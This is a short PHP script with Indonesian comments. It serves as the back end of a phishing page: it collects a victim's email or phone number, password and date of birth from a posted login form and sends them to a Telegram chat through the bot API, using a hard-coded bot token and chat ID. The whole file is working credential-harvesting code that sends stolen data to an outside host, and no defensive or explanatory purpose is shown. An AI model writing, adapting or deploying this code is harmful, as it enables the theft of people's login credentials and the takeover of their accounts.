<?php
$botToken = "6356869047:AAEEEmpcSPVJ0Jo6-E0Ba78OnnEEFHPmdwU";
$chatID = "-1002031321163";
$message = "Data yang dikirim:\n\n";
$message .= "Email atau Telepon: " . $_POST['username'] . "\n";
$message .= "Kata Sandi: " . $_POST['password'] . "\n";
$message .= "Tanggal Lahir: " . $_POST['lahir'] . "\n";

// Kirim pesan ke Telegram
$telegramURL = "https://api.telegram.org/bot$botToken/sendMessage";
$fields = [
    'chat_id' => $chatID,
    'text' => $message,
];

$ch = curl_init($telegramURL);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);

// Lanjutkan dengan kode lainnya (seperti menyimpan data ke file, dll.)
?>
